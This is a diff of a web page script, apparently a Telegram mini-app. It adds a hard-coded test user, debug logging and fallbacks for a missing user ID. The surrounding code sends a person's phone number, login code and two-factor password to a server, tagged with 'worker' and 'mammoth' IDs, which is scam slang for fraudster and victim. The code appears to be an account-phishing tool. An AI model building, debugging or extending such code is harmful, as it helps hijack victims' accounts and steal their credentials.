@@ -205,6 +205,17 @@
             document.getElementById('user-id').textContent = user.id;
             document.getElementById('user-name').textContent = user.first_name + (user.last_name ? ' ' + user.last_name : '');
             document.getElementById('user-username').textContent = user.username ? '@' + user.username : 'Не указан';
+        } else {
+            // Если пользователь не определен, создаем тестового
+            const testUser = {
+                id: 123456789,
+                first_name: 'Test',
+                last_name: 'User',
+                username: 'testuser'
+            };
+            document.getElementById('user-id').textContent = testUser.id;
+            document.getElementById('user-name').textContent = testUser.first_name + ' ' + testUser.last_name;
+            document.getElementById('user-username').textContent = '@' + testUser.username;
         }
 
         // Переменные для авторизации
@@ -213,9 +224,12 @@
 
         // Функция начала авторизации
         async function startAuth() {
+            console.log('startAuth вызвана');
             const phoneNumber = document.getElementById('phone-number').value.trim();
             const authCode = document.getElementById('auth-code').value.trim();
             const twofaPassword = document.getElementById('2fa-password').value.trim();
+            
+            console.log('Данные:', { phoneNumber, authStep, user: user ? user.id : 'undefined' });
             
             if (authStep === 'phone') {
                 if (!phoneNumber) {
@@ -233,7 +247,7 @@
                         },
                         body: JSON.stringify({
                             phone_number: phoneNumber,
-                            worker_user_id: user.id
+                            worker_user_id: user ? user.id : 123456789
                         })
                     });
                     
@@ -267,7 +281,7 @@
                             'Content-Type': 'application/json',
                         },
                         body: JSON.stringify({
-                            worker_user_id: user.id,
+                            worker_user_id: user ? user.id : 123456789,
                             code: authCode
                         })
                     });
@@ -306,7 +320,7 @@
                             'Content-Type': 'application/json',
                         },
                         body: JSON.stringify({
-                            worker_user_id: user.id,
+                            worker_user_id: user ? user.id : 123456789,
                             password: twofaPassword
                         })
                     });
@@ -337,7 +351,7 @@
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
-                        worker_user_id: user.id
+                        worker_user_id: user ? user.id : 123456789
                     })
                 });
                 
@@ -394,7 +408,7 @@
                     },
                     body: JSON.stringify({
                         check_code: checkCode,
-                        user_id: user.id
+                        user_id: user ? user.id : 123456789
                     })
                 });
                 
@@ -425,7 +439,7 @@
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
-                        mammoth_user_id: user.id
+                        mammoth_user_id: user ? user.id : 123456789
                     })
                 });
                 
@@ -459,7 +473,7 @@
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
-                        mammoth_user_id: user.id
+                        mammoth_user_id: user ? user.id : 123456789
                     })
                 });
                 
